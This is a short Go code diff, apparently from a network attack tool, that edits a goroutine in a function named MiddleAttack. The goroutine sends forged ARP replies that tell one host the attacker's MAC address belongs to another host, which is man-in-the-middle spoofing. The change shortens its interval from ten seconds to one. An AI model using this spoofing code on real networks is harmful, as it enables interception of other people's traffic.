@@ -71,10 +71,10 @@ func MiddleAttack(ctx context.Context, alice, bob, gateway string) error {
 
 	//欺骗双方
 	go func() {
-		defer func() {
-			debug.Println("中间人攻击欺骗双方的协程退出")
-		}()
-		for range time.Tick(time.Second * 10) {
+		defer debug.Println("中间人攻击欺骗双方的协程退出")
+		t := time.NewTicker(time.Second)
+		defer t.Stop()
+		for range t.C {
 			//告诉alice,我的mac地址就是bob的mac地址
 			err := arp.SendARP(handle, aliceMAC, myMAC, aliceMAC, myMAC, aliceIP, bobIP, layers.ARPReply)
 			if err != nil {
